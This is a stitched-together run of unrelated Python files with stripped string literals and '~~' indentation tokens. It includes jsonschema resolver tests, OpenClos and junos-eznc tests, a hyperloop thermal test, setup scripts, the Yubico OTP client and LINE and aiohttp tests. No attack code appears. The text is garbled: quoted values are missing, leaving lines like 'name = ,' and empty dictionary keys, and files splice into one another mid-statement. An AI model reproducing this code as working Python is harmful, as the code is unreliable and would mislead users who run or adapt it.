with resolver . resolving ( "" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
~~ with resolver . resolving ( "#" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
~~ with resolver . resolving ( "foo" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
~~ with resolver . resolving ( "foo#" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
\n 
~~ ~~ def test_it_can_construct_a_base_uri_from_a_schema_without_id ( self ) : \n 
~~~ schema = { } \n 
resolver = RefResolver . from_schema ( schema ) \n 
self . assertEqual ( resolver . base_uri , "" ) \n 
self . assertEqual ( resolver . resolution_scope , "" ) \n 
with resolver . resolving ( "" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
~~ with resolver . resolving ( "#" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
\n 
~~ ~~ def test_custom_uri_scheme_handlers ( self ) : \n 
~~~ schema = { "foo" : "bar" } \n 
ref = "foo://bar" \n 
foo_handler = mock . Mock ( return_value = schema ) \n 
resolver = RefResolver ( "" , { } , handlers = { "foo" : foo_handler } ) \n 
with resolver . resolving ( ref ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema ) \n 
~~ foo_handler . assert_called_once_with ( ref ) \n 
\n 
~~ def test_cache_remote_on ( self ) : \n 
~~~ ref = "foo://bar" \n 
foo_handler = mock . Mock ( ) \n 
resolver = RefResolver ( \n 
"" , { } , cache_remote = True , handlers = { "foo" : foo_handler } , \n 
) \n 
with resolver . resolving ( ref ) : \n 
~~~ pass \n 
~~ with resolver . resolving ( ref ) : \n 
~~~ pass \n 
~~ foo_handler . assert_called_once_with ( ref ) \n 
\n 
~~ def test_cache_remote_off ( self ) : \n 
~~~ ref = "foo://bar" \n 
foo_handler = mock . Mock ( ) \n 
resolver = RefResolver ( \n 
"" , { } , cache_remote = False , handlers = { "foo" : foo_handler } , \n 
) \n 
with resolver . resolving ( ref ) : \n 
~~~ pass \n 
~~ self . assertEqual ( foo_handler . call_count , 1 ) \n 
\n 
~~ def test_if_you_give_it_junk_you_get_a_resolution_error ( self ) : \n 
~~~ ref = "foo://bar" \n 
foo_handler = mock . Mock ( side_effect = ValueError ( "Oh no! What\'s this?" ) ) \n 
resolver = RefResolver ( "" , { } , handlers = { "foo" : foo_handler } ) \n 
with self . assertRaises ( RefResolutionError ) as err : \n 
~~~ with resolver . resolving ( ref ) : \n 
~~~ pass \n 
~~ ~~ self . assertEqual ( str ( err . exception ) , "Oh no! What\'s this?" ) \n 
\n 
~~ def test_helpful_error_message_on_failed_pop_scope ( self ) : \n 
~~~ resolver = RefResolver ( "" , { } ) \n 
resolver . pop_scope ( ) \n 
with self . assertRaises ( RefResolutionError ) as exc : \n 
~~~ resolver . pop_scope ( ) \n 
~~ self . assertIn ( "Failed to pop the scope" , str ( exc . exception ) ) \n 
\n 
\n 
~~ ~~ class UniqueTupleItemsMixin ( object ) : \n 
~~~ """\n    A tuple instance properly formats validation errors for uniqueItems.\n\n    See https://github.com/Julian/jsonschema/pull/224\n\n    """ \n 
\n 
def test_it_properly_formats_an_error_message ( self ) : \n 
~~~ validator = self . validator_class ( \n 
schema = { "uniqueItems" : True } , \n 
types = { "array" : ( tuple , ) } , \n 
) \n 
with self . assertRaises ( ValidationError ) as e : \n 
~~~ validator . validate ( ( 1 , 1 ) ) \n 
~~ self . assertIn ( "(1, 1) has non-unique elements" , str ( e . exception ) ) \n 
\n 
\n 
~~ ~~ class TestDraft4UniqueTupleItems ( UniqueTupleItemsMixin , unittest . TestCase ) : \n 
~~~ validator_class = Draft4Validator \n 
\n 
\n 
~~ class TestDraft3UniqueTupleItems ( UniqueTupleItemsMixin , unittest . TestCase ) : \n 
~~~ validator_class = Draft3Validator \n 
\n 
\n 
~~ def sorted_errors ( errors ) : \n 
~~~ def key ( error ) : \n 
~~~ return ( \n 
[ str ( e ) for e in error . path ] , \n 
[ str ( e ) for e in error . schema_path ] \n 
) \n 
~~ return sorted ( errors , key = key ) \n 
~~ \n 
import unittest \n 
import os \n 
\n 
from jnpr . openclos . report import ResourceAllocationReport , L2Report , L3Report \n 
from test_dao import InMemoryDao \n 
\n 
class Test ( unittest . TestCase ) : \n 
\n 
\n 
~~~ def setUp ( self ) : \n 
~~~ \n 
self . __conf = { } \n 
self . __conf [ ] = os . path . join ( os . path . dirname ( os . path . abspath ( __file__ ) ) , ) \n 
self . __conf [ ] = \n 
self . __conf [ ] = \n 
self . __conf [ ] = { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: \n 
} \n 
self . __conf [ ] = { : , : [ , , ] } \n 
self . __conf [ ] = { \n 
"qfx5100-24q-2p" : { \n 
"ports" : \n 
} , \n 
"qfx5100-48s-6q" : { \n 
"uplinkPorts" : , \n 
"downlinkPorts" : \n 
} \n 
} \n 
self . _dao = InMemoryDao . getInstance ( ) \n 
#self.report = ResourceAllocationReport(self.__conf, InMemoryDao) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ self . _dao = None \n 
InMemoryDao . _destroy ( ) \n 
\n 
~~ \'\'\'\n    def testGetInterconnectAllocation(self):\n        from test_model import createPod\n        pod = createPod("test", self.session)\n        pod.allocatedInterConnectBlock = \'1.2.3.4/24\'\n        pod.interConnectPrefix = \'1.2.0.0/24\'\n        \n        interconnectAllocation = self.report.getInterconnectAllocation("test")\n        self.assertEqual(\'1.2.0.0/24\', interconnectAllocation[\'block\'])\n        self.assertEqual(\'1.2.3.4/24\', interconnectAllocation[\'allocated\'])\n\n    def testGetInterconnectAllocationNoPod(self):\n        interconnectAllocation = self.report.getInterconnectAllocation("test")\n        self.assertEqual({}, interconnectAllocation)\n    \'\'\' \n 
\n 
def testGenerateL2Report ( self ) : \n 
~~~ l2Report = L2Report ( self . __conf , self . _dao ) \n 
from test_model import createPod \n 
with self . _dao . getReadSession ( ) as session : \n 
~~~ pod = createPod ( "test" , session ) \n 
l2Report . generateReport ( pod . id , True , False ) \n 
\n 
~~ ~~ def testGenerateL3Report ( self ) : \n 
~~~ l3Report = L3Report ( self . __conf , self . _dao ) \n 
from test_model import createPod \n 
with self . _dao . getReadSession ( ) as session : \n 
~~~ pod = createPod ( "test" , session ) \n 
l3Report . generateReport ( pod . id , True , False ) \n 
\n 
~~ ~~ ~~ if __name__ == "__main__" : \n 
\n 
~~~ unittest . main ( ) import yaml \n 
~~ import os . path \n 
\n 
from jnpr . junos . factory . factory_loader import FactoryLoader \n 
\n 
__all__ = [ , ] \n 
\n 
\n 
def loadyaml ( path ) : \n 
~~~ """\n    Load a YAML file at :path: that contains Table and View definitions.\n    Returns a <dict> of item-name anditem-class definition.\n\n    If you want to import these definitions directly into your namespace,\n    (like a module) you would do the following:\n\n      globals().update( loadyaml( <path-to-yaml-file> ))\n\n    If you did not want to do this, you can access the items as the <dict>.\n    For example, if your YAML file contained a Table called MyTable, then\n    you could do something like:\n\n      catalog = loadyaml( <path-to-yaml-file> )\n      MyTable = catalog[\'MyTable\']\n\n      table = MyTable(dev)\n      table.get()\n      ...\n    """ \n 
\n 
if os . path . splitext ( path ) [ 1 ] == : \n 
~~~ path += \n 
~~ return FactoryLoader ( ) . load ( yaml . load ( open ( path , ) ) ) \n 
~~ """\nPythonifier for ISIS Table/View\n""" \n 
from jnpr . junos . factory import loadyaml \n 
from os . path import splitext \n 
_YAML_ = splitext ( __file__ ) [ 0 ] + \n 
globals ( ) . update ( loadyaml ( _YAML_ ) ) \n 
\n 
import unittest \n 
from nose . plugins . attrib import attr \n 
\n 
from jnpr . junos import Device \n 
\n 
\n 
@ attr ( ) \n 
class TestDeviceSsh ( unittest . TestCase ) : \n 
\n 
~~~ def tearDown ( self ) : \n 
~~~ self . dev . close ( ) \n 
\n 
~~ def test_device_open_default_key ( self ) : \n 
~~~ self . dev = Device ( ) \n 
self . dev . open ( ) \n 
self . assertEqual ( self . dev . connected , True ) \n 
\n 
~~ def test_device_open_key_pass ( self ) : \n 
~~~ self . dev = Device ( host = , ssh_private_key_file = self . dev . open ( ) \n 
self . assertEqual ( self . dev . connected , True ) \n 
~~ ~~ __author__ = "Nitin Kumar, Rick Sherman" \n 
__credits__ = "Jeremy Schulman" \n 
\n 
import unittest \n 
from nose . plugins . attrib import attr \n 
\n 
from jnpr . junos import Device \n 
from jnpr . junos . utils . util import Util \n 
\n 
from mock import patch \n 
\n 
\n 
@ attr ( ) \n 
class TestUtil ( unittest . TestCase ) : \n 
\n 
~~~ @ patch ( ) \n 
def setUp ( self , mock_connect ) : \n 
~~~ self . dev = Device ( host = , user = , password = , \n 
gather_facts = False ) \n 
self . dev . open ( ) \n 
self . util = Util ( self . dev ) \n 
\n 
~~ def test_repr ( self ) : \n 
~~~ self . assertEqual ( repr ( self . util ) , ) \n 
\n 
~~ def test_dev_setter_exception ( self ) : \n 
~~~ def mod_dev ( ) : \n 
~~~ self . util . dev = \n 
~~ self . assertRaises ( RuntimeError , mod_dev ) \n 
\n 
~~ def test_rpc_setter_exception ( self ) : \n 
~~~ def mod_rpc ( ) : \n 
~~~ self . util . rpc = \n 
~~ self . assertRaises ( RuntimeError , mod_rpc ) \n 
~~ ~~ import unittest \n 
\n 
from openmdao . main . api import set_as_top , Assembly \n 
from openmdao . util . testutil import assert_rel_error \n 
from openmdao . lib . drivers . api import BroydenSolver \n 
from hyperloop . tube_wall_temp import TubeWallTemp \n 
\n 
\n 
class TubeHeatBalance ( Assembly ) : \n 
\n 
~~~ def configure ( self ) : \n 
\n 
~~~ tm = self . add ( , TubeWallTemp ( ) ) \n 
#tm.bearing_air.setTotalTP() \n 
driver = self . add ( , BroydenSolver ( ) ) \n 
driver . add_parameter ( , low = 0. , high = 10000. ) \n 
driver . add_constraint ( ) \n 
driver . workflow . add ( [ ] ) \n 
\n 
\n 
~~ ~~ class TubeWallTestCase ( unittest . TestCase ) : \n 
\n 
~~~ def test_tube_temp ( self ) : \n 
\n 
~~~ test = set_as_top ( TubeHeatBalance ( ) ) \n 
#set input values \n 
test . tm . nozzle_air . setTotalTP ( 1710 , 0.304434211 ) \n 
test . tm . nozzle_air . W = 1.08 \n 
test . tm . bearing_air . W = 0. \n 
test . tm . diameter_outer_tube = 2.22504 test . tm . length_tube = 482803. test . tm . num_pods = 34. test . tm . temp_boundary = 322.361 test . tm . temp_outside_ambient = 305.6 \n 
test . run ( ) \n 
assert_rel_error ( self , test . tm . heat_rate_pod , 353244. , 0.02 ) \n 
assert_rel_error ( self , test . tm . total_heat_rate_pods , 12010290. , 0.02 ) \n 
assert_rel_error ( self , test . tm . GrDelTL3 , 123775609 , 0.02 ) \n 
assert_rel_error ( self , test . tm . Pr , 0.707 , 0.02 ) \n 
assert_rel_error ( self , test . tm . Gr , 23163846280. , 0.02 ) \n 
assert_rel_error ( self , test . tm . Ra , 16369476896. , 0.02 ) \n 
assert_rel_error ( self , test . tm . Nu , 281.6714 , 0.02 ) #http://www.egr.msu.edu/~somerton/Nusselt/ii/ii_a/ii_a_3/ii_a_3_a.html assert_rel_error ( self , test . tm . k , 0.02655 , 0.02 ) \n 
assert_rel_error ( self , test . tm . h , 3.3611 , 0.02 ) \n 
assert_rel_error ( self , test . tm . area_convection , 3374876 , 0.02 ) \n 
assert_rel_error ( self , test . tm . q_per_area_nat_conv , 57.10 , 0.02 ) \n 
assert_rel_error ( self , test . tm . total_q_nat_conv , 192710349 , 0.02 ) \n 
assert_rel_error ( self , test . tm . area_viewing , 1074256. , 0.02 ) \n 
assert_rel_error ( self , test . tm . q_per_area_solar , 350. , 0.02 ) \n 
assert_rel_error ( self , test . tm . q_total_solar , 375989751. , 0.02 ) \n 
assert_rel_error ( self , test . tm . area_rad , 3374876.115 , 0.02 ) \n 
assert_rel_error ( self , test . tm . q_rad_per_area , 59.7 , 0.02 ) \n 
assert_rel_error ( self , test . tm . q_rad_tot , 201533208 , 0.02 ) \n 
assert_rel_error ( self , test . tm . q_total_out , 394673364. , 0.02 ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) #!/usr/bin/env python3 \n 
# -*- coding: utf-8 -*- \n 
# vim: set hls is et sw=4 sts=4 ts=8: \n 
\n 
~~ import os \n 
from setuptools import setup , find_packages \n 
\n 
\n 
with open ( os . path . join ( os . path . dirname ( __file__ ) , ) ) as f : \n 
~~~ required = f . read ( ) . splitlines ( ) \n 
\n 
~~ setup ( \n 
name = , \n 
version = , \n 
description = , \n 
author = , \n 
author_email = , \n 
packages = find_packages ( exclude = [ , , ] ) , \n 
include_package_data = True , \n 
setup_requires = [ \n 
, \n 
] , \n 
install_requires = required , \n 
entry_points = { \n 
: [ \n 
, \n 
] , \n 
} , \n 
) \n 
\n 
del required \n 
# -*- coding: utf-8 -*- \n 
# \n 
# Name: Yubico Python Client \n 
# Description: Python class for verifying Yubico One Time Passwords (OTPs). \n 
# \n 
# Author: Tomaz Muraus (http://www.tomaz.me) \n 
# License: BSD \n 
# \n 
# Copyright (c) 2010-2013, Tomaž Muraus \n 
# Copyright (c) 2012, Yubico AB \n 
# All rights reserved. \n 
\n 
import re \n 
import os \n 
import sys \n 
import time \n 
import hmac \n 
import base64 \n 
import hashlib \n 
import threading \n 
import logging \n 
\n 
import requests \n 
\n 
from yubico_client . otp import OTP \n 
from yubico_client . yubico_exceptions import ( StatusCodeError , \n 
InvalidClientIdError , \n 
InvalidValidationResponse , \n 
SignatureVerificationError ) \n 
from yubico_client . py3 import b \n 
from yubico_client . py3 import urlencode \n 
from yubico_client . py3 import unquote \n 
\n 
logger = logging . getLogger ( ) \n 
\n 
# Path to the standard CA bundle file locations for most of the operating \n 
# systems \n 
COMMON_CA_LOCATIONS = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
DEFAULT_API_URLS = ( , \n 
, \n 
, \n 
, \n 
) \n 
\n 
# How long to wait before the time out occurs \n 
DEFAULT_TIMEOUT = 10 \n 
\n 
# How many seconds can pass between the first and last OTP generation so the \n 
# OTP is still considered valid \n 
DEFAULT_MAX_TIME_WINDOW = 5 \n 
\n 
BAD_STATUS_CODES = [ , , , \n 
, , \n 
, , \n 
] \n 
\n 
\n 
class Yubico ( object ) : \n 
~~~ def __init__ ( self , client_id , key = None , verify_cert = True , \n 
translate_otp = True , api_urls = DEFAULT_API_URLS , \n 
ca_certs_bundle_path = None ) : \n 
\n 
~~~ if ca_certs_bundle_path and not self . _is_valid_ca_bundle_file ( ca_certs_bundle_path ) : \n 
~~~ raise ValueError ( ( \n 
) ) \n 
\n 
~~ self . client_id = client_id \n 
\n 
if key is not None : \n 
~~~ key = base64 . b64decode ( key . encode ( ) ) \n 
\n 
~~ self . key = key \n 
self . verify_cert = verify_cert \n 
self . translate_otp = translate_otp \n 
self . api_urls = self . _init_request_urls ( api_urls = api_urls ) \n 
self . ca_certs_bundle_path = ca_certs_bundle_path \n 
\n 
~~ def verify ( self , otp , timestamp = False , sl = None , timeout = None , \n 
return_response = False ) : \n 
~~~ """\n        Verify a provided OTP.\n\n        :param otp: OTP to verify.\n        :type otp: ``str``\n\n        :param timestamp: True to include request timestamp and session counter\n                          in the response. Defaults to False.\n        :type timestamp: ``bool``\n\n        :param sl: A value indicating percentage of syncing required by client.\n        :type sl: ``int`` or ``str``\n\n        :param timeout: Number of seconds to wait for sync responses.\n        :type timeout: ``int``\n\n        :param return_response: True to return a response object instead of the\n                                status code. Defaults to False.\n        :type return_response: ``bool``\n\n        :return: True is the provided OTP is valid, False if the\n        REPLAYED_OTP status value is returned or the response message signature\n        verification failed and None for the rest of the status values.\n        """ \n 
ca_bundle_path = self . _get_ca_bundle_path ( ) \n 
\n 
otp = OTP ( otp , self . translate_otp ) \n 
rand_str = b ( os . urandom ( 30 ) ) \n 
nonce = base64 . b64encode ( rand_str , b ( ) ) [ : 25 ] . decode ( ) \n 
query_string = self . generate_query_string ( otp . otp , nonce , timestamp , \n 
sl , timeout ) \n 
\n 
threads = [ ] \n 
timeout = timeout or DEFAULT_TIMEOUT \n 
for url in self . api_urls : \n 
~~~ thread = URLThread ( % ( url , query_string ) , timeout , \n 
self . verify_cert , ca_bundle_path ) \n 
thread . start ( ) \n 
threads . append ( thread ) \n 
\n 
# Wait for a first positive or negative response \n 
~~ start_time = time . time ( ) \n 
while threads and ( start_time + timeout ) > time . time ( ) : \n 
~~~ for thread in threads : \n 
~~~ if not thread . is_alive ( ) : \n 
~~~ if thread . exception : \n 
~~~ raise thread . exception \n 
~~ elif thread . response : \n 
~~~ status = self . verify_response ( thread . response , \n 
otp . otp , nonce , \n 
return_response ) \n 
\n 
if status : \n 
~~~ if return_response : \n 
~~~ return status \n 
~~ else : \n 
~~~ return True \n 
~~ ~~ ~~ threads . remove ( thread ) \n 
~~ ~~ time . sleep ( 0.1 ) \n 
\n 
# Timeout or no valid response received \n 
~~ raise Exception ( ) \n 
\n 
~~ def verify_multi ( self , otp_list , max_time_window = DEFAULT_MAX_TIME_WINDOW , \n 
sl = None , timeout = None ) : \n 
~~~ """\n        Verify a provided list of OTPs.\n\n        :param max_time_window: Maximum number of seconds which can pass\n                                between the first and last OTP generation for\n                                the OTP to still be considered valid.\n        :type max_time_window: ``int``\n        """ \n 
\n 
# Create the OTP objects \n 
otps = [ ] \n 
for otp in otp_list : \n 
~~~ otps . append ( OTP ( otp , self . translate_otp ) ) \n 
\n 
~~ if len ( otp_list ) < 2 : \n 
~~~ raise ValueError ( ) \n 
\n 
~~ device_ids = set ( ) \n 
for otp in otps : \n 
~~~ device_ids . add ( otp . device_id ) \n 
\n 
# Check that all the OTPs contain same device id \n 
~~ if len ( device_ids ) != 1 : \n 
~~~ raise Exception ( ) \n 
\n 
# Now we verify the OTPs and save the server response for each OTP. \n 
# We need the server response, to retrieve the timestamp. \n 
\n 
# server but in this case, user would need to provide his AES key. \n 
~~ for otp in otps : \n 
~~~ response = self . verify ( otp . otp , True , sl , timeout , \n 
return_response = True ) \n 
\n 
if not response : \n 
~~~ return False \n 
\n 
~~ otp . timestamp = int ( response [ ] ) \n 
\n 
~~ count = len ( otps ) \n 
delta = otps [ count - 1 ] . timestamp - otps [ 0 ] . timestamp \n 
\n 
# OTPs have an 8Hz timestamp counter so we need to divide it to get \n 
# seconds \n 
delta = delta / 8 \n 
\n 
if delta < 0 : \n 
~~~ raise Exception ( \n 
) \n 
\n 
~~ if delta > max_time_window : \n 
~~~ raise Exception ( ( \n 
) % \n 
( max_time_window ) ) \n 
\n 
~~ return True \n 
\n 
~~ def verify_response ( self , response , otp , nonce , return_response = False ) : \n 
~~~ """\n        Returns True if the OTP is valid (status=OK) and return_response=False,\n        otherwise (return_response = True) it returns the server response as a\n        dictionary.\n\n        Throws an exception if the OTP is replayed, the server response message\n        verification failed or the client id is invalid, returns False\n        otherwise.\n        """ \n 
try : \n 
~~~ status = re . search ( , response ) . groups ( ) \n 
\n 
if len ( status ) > 1 : \n 
~~~ message = \n 
raise InvalidValidationResponse ( message , response ) \n 
\n 
~~ status = status [ 0 ] \n 
~~ except ( AttributeError , IndexError ) : \n 
~~~ return False \n 
\n 
~~ signature , parameters = self . parse_parameters_from_response ( response ) \n 
\n 
# Secret key is specified, so we verify the response message \n 
# signature \n 
if self . key : \n 
~~~ generated_signature = self . generate_message_signature ( parameters ) \n 
\n 
# Signature located in the response does not match the one we \n 
# have generated \n 
if signature != generated_signature : \n 
~~~ logger . warn ( "signature mismatch for parameters=%r" , parameters ) \n 
raise SignatureVerificationError ( generated_signature , \n 
signature ) \n 
~~ ~~ param_dict = self . get_parameters_as_dictionary ( parameters ) \n 
\n 
if in param_dict and param_dict [ ] != otp : \n 
~~~ message = \n 
raise InvalidValidationResponse ( message , response , param_dict ) \n 
\n 
~~ if in param_dict and param_dict [ ] != nonce : \n 
~~~ message = \n 
raise InvalidValidationResponse ( message , response , param_dict ) \n 
\n 
~~ if status == : \n 
~~~ if return_response : \n 
~~~ return param_dict \n 
~~ else : \n 
~~~ return True \n 
~~ ~~ elif status == : \n 
~~~ raise InvalidClientIdError ( self . client_id ) \n 
~~ elif status == : \n 
~~~ raise StatusCodeError ( status ) \n 
\n 
~~ return False \n 
\n 
~~ def generate_query_string ( self , otp , nonce , timestamp = False , sl = None , \n 
timeout = None ) : \n 
~~~ """\n        Returns a query string which is sent to the validation servers.\n        """ \n 
data = [ ( , self . client_id ) , \n 
( , otp ) , \n 
( , nonce ) ] \n 
\n 
if timestamp : \n 
~~~ data . append ( ( , ) ) \n 
\n 
~~ if sl is not None : \n 
~~~ if sl not in range ( 0 , 101 ) and sl not in [ , ] : \n 
~~~ raise Exception ( \n 
\'100 or string "fast" or "secure"\' ) \n 
\n 
~~ data . append ( ( , sl ) ) \n 
\n 
~~ if timeout : \n 
~~~ data . append ( ( , timeout ) ) \n 
\n 
~~ query_string = urlencode ( data ) \n 
\n 
if self . key : \n 
~~~ hmac_signature = self . generate_message_signature ( query_string ) \n 
hmac_signature = hmac_signature \n 
query_string += % ( hmac_signature . replace ( , ) ) \n 
\n 
~~ return query_string \n 
\n 
~~ def generate_message_signature ( self , query_string ) : \n 
~~~ """\n        Returns a HMAC-SHA-1 signature for the given query string.\n        http://goo.gl/R4O0E\n        """ \n 
# split for sorting \n 
pairs = query_string . split ( ) \n 
pairs = [ pair . split ( , 1 ) for pair in pairs ] \n 
pairs_sorted = sorted ( pairs ) \n 
pairs_string = . join ( [ . join ( pair ) for pair in pairs_sorted ] ) \n 
\n 
digest = hmac . new ( self . key , b ( pairs_string ) , hashlib . sha1 ) . digest ( ) \n 
signature = base64 . b64encode ( digest ) . decode ( ) \n 
\n 
return signature \n 
\n 
~~ def parse_parameters_from_response ( self , response ) : \n 
~~~ """\n        Returns a response signature and query string generated from the\n        server response. \'h\' aka signature argument is stripped from the\n        returned query string.\n        """ \n 
lines = response . splitlines ( ) \n 
pairs = [ line . strip ( ) . split ( , 1 ) for line in lines if in line ] \n 
pairs = sorted ( pairs ) \n 
signature = ( [ unquote ( v ) for k , v in pairs if k == ] or [ None ] ) [ 0 ] \n 
# already quoted \n 
query_string = . join ( [ k + + v for k , v in pairs if k != ] ) \n 
\n 
return ( signature , query_string ) \n 
\n 
~~ def get_parameters_as_dictionary ( self , query_string ) : \n 
~~~ """ Returns query string parameters as a dictionary. """ \n 
pairs = ( x . split ( , 1 ) for x in query_string . split ( ) ) \n 
return dict ( ( k , unquote ( v ) ) for k , v in pairs ) \n 
\n 
~~ def _init_request_urls ( self , api_urls ) : \n 
~~~ """\n        Returns a list of the API URLs.\n        """ \n 
if not isinstance ( api_urls , ( str , list , tuple ) ) : \n 
~~~ raise TypeError ( ) \n 
\n 
~~ if isinstance ( api_urls , str ) : \n 
~~~ api_urls = ( api_urls , ) \n 
\n 
~~ api_urls = list ( api_urls ) \n 
\n 
for url in api_urls : \n 
~~~ if not url . startswith ( ) and not url . startswith ( ) : \n 
~~~ raise ValueError ( ( \'URL "%s" contains an invalid or missing\' \n 
% ( url ) ) ) \n 
\n 
~~ ~~ return list ( api_urls ) \n 
\n 
~~ def _get_ca_bundle_path ( self ) : \n 
~~~ """\n        Return a path to the CA bundle which is used for verifying the hosts\n        SSL certificate.\n        """ \n 
if self . ca_certs_bundle_path : \n 
# User provided a custom path \n 
~~~ return self . ca_certs_bundle_path \n 
\n 
# Return first bundle which is available \n 
~~ for file_path in COMMON_CA_LOCATIONS : \n 
~~~ if self . _is_valid_ca_bundle_file ( file_path = file_path ) : \n 
~~~ return file_path \n 
\n 
~~ ~~ return None \n 
\n 
~~ def _is_valid_ca_bundle_file ( self , file_path ) : \n 
~~~ return os . path . exists ( file_path ) and os . path . isfile ( file_path ) \n 
\n 
\n 
~~ ~~ class URLThread ( threading . Thread ) : \n 
~~~ def __init__ ( self , url , timeout , verify_cert , ca_bundle_path = None ) : \n 
~~~ super ( URLThread , self ) . __init__ ( ) \n 
self . url = url \n 
self . timeout = timeout \n 
self . verify_cert = verify_cert \n 
self . ca_bundle_path = ca_bundle_path \n 
self . exception = None \n 
self . request = None \n 
self . response = None \n 
\n 
~~ def run ( self ) : \n 
~~~ logger . debug ( % ( self . url , \n 
self . name ) ) \n 
verify = self . verify_cert \n 
\n 
if self . ca_bundle_path is not None : \n 
~~~ verify = self . ca_bundle_path \n 
logger . debug ( % ( self . ca_bundle_path ) ) \n 
\n 
~~ try : \n 
~~~ self . request = requests . get ( url = self . url , timeout = self . timeout , \n 
verify = verify ) \n 
self . response = self . request . content . decode ( ) \n 
~~ except requests . exceptions . SSLError : \n 
~~~ e = sys . exc_info ( ) [ 1 ] \n 
self . exception = e \n 
self . response = None \n 
~~ except Exception : \n 
~~~ e = sys . exc_info ( ) [ 1 ] \n 
logger . error ( + str ( e ) ) \n 
self . response = None \n 
\n 
~~ args = ( self . url , self . name , self . response ) \n 
logger . debug ( % args ) \n 
#!/usr/bin/env python3 \n 
~~ ~~ import logging \n 
\n 
from app import app , logger \n 
\n 
root = logging . getLogger ( ) \n 
root . setLevel ( logging . DEBUG ) \n 
\n 
logging . getLogger ( "sqlalchemy.engine" ) . setLevel ( logging . INFO ) \n 
\n 
\n 
if __name__ == : \n 
~~~ logger . warn ( "This is a debugging configuration. Run with the gunicorn script to run in production." app . run ( host = , debug = True ) \n 
~~ from setuptools import setup \n 
\n 
\n 
setup ( \n 
name = , \n 
version = , \n 
py_modules = [ ] , \n 
install_requires = [ \n 
, \n 
, \n 
] , \n 
entry_points = , \n 
) \n 
from nose . tools import ok_ , raises \n 
\n 
from linot import config \n 
from linot . interfaces . line_interface import LineClientP , LineInterface \n 
\n 
\n 
class TestLineClientP : \n 
~~~ def setUp ( self ) : \n 
~~~ self . line_cfg = config [ ] [ ] \n 
self . lineclient = LineClientP ( self . line_cfg [ ] , \n 
self . line_cfg [ ] ) \n 
\n 
~~ def test_find_contact_by_id ( self ) : \n 
~~~ contact = self . lineclient . find_contact_by_id ( self . line_cfg [ ] ) \n 
ok_ ( contact . id == self . line_cfg [ ] ) \n 
\n 
~~ @ raises ( ValueError ) \n 
def test_find_contact_by_id_exception ( self ) : \n 
~~~ self . lineclient . find_contact_by_id ( self . line_cfg [ ] [ : - 2 ] ) \n 
\n 
\n 
~~ ~~ class TestLineInterface : \n 
~~~ def setUp ( self ) : \n 
~~~ self . line_interface = LineInterface ( ) \n 
\n 
~~ def test_polling_command ( self ) : \n 
~~~ test_str = \n 
# first sends a message to myself.. \n 
me = self . line_interface . _client . getProfile ( ) \n 
me . sendMessage ( test_str ) \n 
result = self . line_interface . polling_command ( ) \n 
ok_ ( len ( result ) == 1 , result ) \n 
submitter , msg = result [ 0 ] \n 
ok_ ( submitter . code == me . id , submitter ) \n 
ok_ ( msg == test_str , \n 
. format ( msg , test_str ) ) \n 
\n 
~~ def test_get_contact_by_id ( self ) : \n 
~~~ me = self . line_interface . _client . getProfile ( ) \n 
contact = self . line_interface . _get_contact_by_id ( me . id ) \n 
ok_ ( me . id == contact . id , . format ( me . id , contact . id ) ) \n 
\n 
~~ def test_send_message ( self ) : \n 
# first sends a message to myself.. \n 
~~~ test_str = \n 
me = self . line_interface . _client . getProfile ( ) \n 
me . sendMessage ( test_str ) \n 
result = self . line_interface . polling_command ( ) \n 
me , msg = result [ 0 ] \n 
self . line_interface . send_message ( me , test_str ) \n 
result = self . line_interface . polling_command ( ) \n 
me , msg = result [ 0 ] \n 
ok_ ( msg == test_str , . format ( msg , test_str ) ) \n 
\n 
~~ def test_send_message_to_id ( self ) : \n 
# first sends a message to myself.. \n 
~~~ test_str = \n 
me = self . line_interface . _client . getProfile ( ) \n 
me . sendMessage ( test_str ) \n 
result = self . line_interface . polling_command ( ) \n 
me , msg = result [ 0 ] \n 
self . line_interface . _send_message_to_id ( me . code , test_str ) \n 
result = self . line_interface . polling_command ( ) \n 
me , msg = result [ 0 ] \n 
ok_ ( msg == test_str , . format ( msg , test_str ) ) \n 
\n 
~~ def test_get_display_name ( self ) : \n 
# first sends a message to myself.. \n 
~~~ test_str = \n 
me = self . line_interface . _client . getProfile ( ) \n 
me . sendMessage ( test_str ) \n 
result = self . line_interface . polling_command ( ) \n 
me_submitter , msg = result [ 0 ] \n 
me_display_name = self . line_interface . get_display_name ( me_submitter ) \n 
ok_ ( me_display_name == me . name ) \n 
~~ ~~ import pytest \n 
import socket \n 
from aiohttp . parsers import StreamWriter , CORK \n 
from unittest import mock \n 
\n 
\n 
# nodelay \n 
\n 
def test_nodelay_default ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
assert not writer . tcp_nodelay \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
\n 
\n 
~~ def test_set_nodelay_no_change ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( False ) \n 
assert not writer . tcp_nodelay \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
\n 
\n 
~~ def test_set_nodelay_enable ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
